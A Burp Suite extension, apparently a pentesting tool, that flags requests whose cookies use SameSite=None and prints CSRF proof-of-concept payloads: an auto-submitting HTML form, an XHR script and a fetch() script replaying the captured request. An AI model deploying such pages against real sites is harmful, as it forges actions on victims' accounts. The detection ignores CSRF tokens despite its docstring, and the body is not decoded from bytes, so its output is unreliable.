from burp import IBurpExtender, IHttpListener, IExtensionHelpers
from java.io import PrintWriter
from java.net import URL

class BurpExtender(IBurpExtender, IHttpListener):
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        self._callbacks.setExtensionName("CSRF PoC Generator")
        self._stdout = PrintWriter(callbacks.getStdout(), True)
        self._stderr = PrintWriter(callbacks.getStderr(), True)

        # Register HTTP listener
        callbacks.registerHttpListener(self)

        self._stdout.println("CSRF PoC Generator loaded successfully!")

    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
        if not messageIsRequest:
            return  # Only process requests

        request_info = self._helpers.analyzeRequest(messageInfo)
        headers = request_info.getHeaders()
        method = request_info.getMethod()
        url = request_info.getUrl()
        body = messageInfo.getRequest()[request_info.getBodyOffset():]

        # Check if the request is vulnerable to CSRF
        if self.is_csrf_vulnerable(request_info, messageInfo):
            self._stdout.println("Potential CSRF vulnerability found: {}".format(url))
            self.generate_csrf_poc(request_info, url, method, body)

    def is_csrf_vulnerable(self, request_info, messageInfo):
        """
        Check if the request is potentially vulnerable to CSRF.
        """
        headers = request_info.getHeaders()
        response = messageInfo.getResponse()
        if response:
            cookies = self._helpers.analyzeResponse(response).getCookies()

            # Check for SameSite=None or missing CSRF tokens
            for cookie in cookies:
                if "SameSite=None" in str(cookie):
                    return True
        return False

    def generate_csrf_poc(self, request_info, url, method, body):
        """
        Generate CSRF PoCs (HTML form, XHR, Fetch JS).
        """
        # Generate HTML form PoC
        html_form = """
        <html>
            <body>
                <form action="{0}" method="{1}">
                    {2}
                </form>
                <script>document.forms[0].submit();</script>
            </body>
        </html>
        """.format(url, method, self.generate_form_fields(body))
        self._stdout.println("HTML Form PoC:\n" + html_form)

        # Generate XHR PoC
        xhr_poc = """
        <script>
            var xhr = new XMLHttpRequest();
            xhr.open("{0}", "{1}", true);
            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            xhr.send("{2}");
        </script>
        """.format(method, url, body)
        self._stdout.println("XHR PoC:\n" + xhr_poc)

        # Generate Fetch PoC
        fetch_poc = """
        <script>
            fetch("{0}", {{
                method: "{1}",
                headers: {{ "Content-Type": "application/x-www-form-urlencoded" }},
                body: "{2}"
            }});
        </script>
        """.format(url, method, body)
        self._stdout.println("Fetch PoC:\n" + fetch_poc)

    def generate_form_fields(self, body):
        """
        Generate form fields from the request body.
        """
        if not body:
            return ""
        fields = []
        for pair in body.split("&"):
            key_value = pair.split("=")
            if len(key_value) == 2:
                key, value = key_value
                fields.append('<input type="hidden" name="{0}" value="{1}">'.format(key, value))
        return "\n".join(fields)

